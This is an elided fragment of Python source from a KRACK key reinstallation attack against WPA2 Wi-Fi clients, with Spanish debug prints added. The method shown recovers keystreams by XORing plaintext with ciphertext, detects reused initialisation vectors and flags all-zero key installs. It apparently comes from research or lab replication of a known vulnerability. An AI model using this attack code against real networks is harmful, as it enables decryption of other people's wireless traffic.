...
#
# Research:
# - Investigate how to make Atheros ACK all frames, still allowing frame injection
...
class KRAckAttack():
	...
	def handle_from_client_pairwise(self, client, p):
		...
		print("CIFRADO", encrypted.encode("hex"), "-----")
		print("TEXTO CIFRADO", encrypted, "-----")

		keystream = xorstr(plaintext, encrypted)
		print("KEYSTREAM", keystream, "-----")
		print("KEYSTREAM HEXA", keystream.encode("hex"), "-----")
		...
		if client.is_iv_reused(iv):
			print("VECTOR DE INICIALIZACION REUSADO", client.is_iv_reused(iv), "-----")
			# If the same keystream is reused, we have a normal key reinstallation attack
			if keystream == client.get_keystream(iv):
				print("KEYSTREAM", keystream, "=", client.get_keystream(iv), "-----")
			...
			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
				...
				print("TODO CERO", self.hostapd_add_allzero_client(client))
			...
			print("KEYSTREAM FALLO", keystream, "VECTOR INICIALIZACION FALLO", iv, "-----")
